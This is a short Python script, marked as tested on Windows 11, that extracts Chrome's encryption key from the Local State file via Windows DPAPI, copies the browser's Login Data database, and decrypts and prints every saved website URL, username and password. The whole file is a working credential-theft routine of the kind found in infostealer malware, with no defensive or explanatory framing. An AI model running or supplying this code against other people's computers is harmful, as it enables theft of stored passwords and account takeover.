# Tested on Microsoft Windows 11

import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil


def get_encryption_key(username):
    local_state_path = f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Local State"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    iv = password[3:15]
    password = password[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(password)[:-16].decode()


def main():
    # Get the current username
    username = os.getlogin()
    key = get_encryption_key(username)
    db_path = f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, username_value, password_value from logins")
    for row in cursor.fetchall():
        origin_url = row[0]
        username_val = row[1]
        password = decrypt_password(row[2], key)
        if username_val or password:
            print(f"Origin URL: {origin_url}")
            print(f"Username: {username_val}")
            print(f"Password: {password}")
            print("*********************************************************")
        else:
            continue

    cursor.close()
    db.close()
    os.remove(filename)


if __name__ == "__main__":
    main()
